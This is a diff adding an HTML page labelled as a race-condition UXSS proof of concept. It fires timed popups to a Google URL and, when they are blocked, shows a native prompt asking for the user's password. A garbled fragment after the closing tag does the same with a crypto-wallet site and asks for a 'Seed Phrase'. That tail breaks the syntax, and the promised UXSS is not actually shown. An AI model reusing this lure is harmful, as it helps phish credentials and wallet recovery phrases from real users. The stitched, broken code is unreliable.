@@ -1,0 +1,34 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>PoC: Race UXSS via window open</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <style>
+    body { font-family: monospace; background: #111; color: #0f0; padding: 20px; }
+    button { padding: 10px 20px; font-size: 16px; }
+  </style>
+</head>
+<body>
+  <h1>UXSS Race Test</h1>
+  <p>Click button below to launch 10 popups in a race attack.</p>
+  <button onclick="startRace()">Launch Attack x10</button>
+
+  <script>
+    function startOnce() {
+      let popup = window.open("https://google.com/csi");
+      if (!popup) {
+        prompt("Please insert your Password");
+      }
+    }
+
+    function startRace() {
+      // Loop 10 times with a short pause
+      for (let i = 0; i < 10; i++) {
+        setTimeout(startOnce, i * 50);
+      }
+    }
+  </script>
+</body>
+</html>  let popup = window.open("https://www.xverse.app/");
+    if (!popup) prompt("Please insert your Seed Phrase");
+}, i * 50);
